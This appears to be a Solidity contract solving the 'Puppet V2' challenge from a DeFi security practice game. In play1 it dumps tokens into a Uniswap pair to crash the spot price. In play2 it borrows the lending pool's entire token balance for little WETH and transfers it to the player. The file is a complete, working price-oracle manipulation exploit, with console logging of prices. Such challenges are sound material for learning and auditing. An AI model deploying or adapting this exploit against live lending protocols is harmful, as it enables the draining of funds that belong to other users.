// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "hardhat/console.sol";

contract PuppetV2Player {
    address private player;
    address private pool;
    address private uniswapPair;
    address private uniswapRouter;
    address private token;
    address private weth;

    constructor(address _player, address _pool, address _uniswapPair, address _uniswapRouter, address _token, address _weth) {
        player = _player;
        pool = _pool;
        uniswapPair = _uniswapPair;
        uniswapRouter = _uniswapRouter;
        token = _token;
        weth = _weth;
    }

    function play1() external {
        bool ok;
        bytes memory data;

        logTokenPrice();

        // sell tokens to uniswap to bring the price down
        (ok, data) = token.call(abi.encodeWithSignature("balanceOf(address)", address(this)));
        require(ok, "token.balanceOf");
        uint myTokens = abi.decode(data, (uint256));
        (ok, data) = token.call(abi.encodeWithSignature("approve(address,uint256)", uniswapRouter, myTokens));
        require(ok, "token.approve");

        address[] memory path = new address[](2);
        path[0] = token;
        path[1] = weth;
        (ok, data) = uniswapRouter.call(abi.encodeWithSignature("swapExactTokensForTokens(uint256,uint256,address[],address,uint256)",
            myTokens,
            0,
            path,
            address(this),
            block.timestamp + 300
        ));
        require(ok, "swapExactTokensForTokens");
        /*uint[] memory amounts = abi.decode(data, (uint[]));
        for (uint i = 0; i < amounts.length; i++) {
            console.log("Amount: ", amounts[i]);
        }*/

        logTokenPrice();
    }

    function play2() external {
        bool ok;
        bytes memory data;

        (ok, data) = weth.call(abi.encodeWithSignature("balanceOf(address)", address(this)));
        require(ok, "weth.balanceOf");
        uint myEth = abi.decode(data, (uint256));
        console.log("myEth", myEth);
        (ok, data) = weth.call(abi.encodeWithSignature("approve(address,uint256)", pool, myEth));
        require(ok, "weth.approve");


        (ok, data) = token.call(abi.encodeWithSignature("balanceOf(address)", pool));
        require(ok, "token.balanceOf");
        uint poolTokens = abi.decode(data, (uint256));

        (ok, data) = pool.call(abi.encodeWithSignature("borrow(uint256)", poolTokens));
        require(ok, "pool.borrow");

        // send balance to player
        (ok, data) = token.call(abi.encodeWithSignature("balanceOf(address)", address(this)));
        require(ok);
        uint myTokens = abi.decode(data, (uint256));
        (ok, data) = token.call(abi.encodeWithSignature("transfer(address,uint256)", player, myTokens));
        require(ok);
    }

    function onERC721Received(
           address operator,
           address from,
           uint256 tokenId,
           bytes calldata data
       ) external pure returns (bytes4) {
           return this.onERC721Received.selector;
       }

       function logTokenPrice() private {
           bool ok;
           bytes memory data;
           uint POOL_INITIAL_TOKEN_BALANCE = 1000000 * 10 ** 18;
           // function calculateDepositOfWETHRequired(uint256 tokenAmount) public view returns (uint256)
           (ok, data) = pool.call(abi.encodeWithSignature("calculateDepositOfWETHRequired(uint256)", POOL_INITIAL_TOKEN_BALANCE));
           uint p = abi.decode(data, (uint));
           console.log("price needed", p);

           (ok, data) = token.call(abi.encodeWithSignature("balanceOf(address)", uniswapPair));
           require(ok, "token.balanceOf(uniswapPair)");
           uint tokensBalance = abi.decode(data, (uint256));
           console.log("uniswap tokens", tokensBalance);

           (ok, data) = weth.call(abi.encodeWithSignature("balanceOf(address)", uniswapPair));
           require(ok, "weth.balanceOf(uniswapPair)");
           uint wethBalance = abi.decode(data, (uint256));
           console.log("uniswap weth", wethBalance);
       }
}
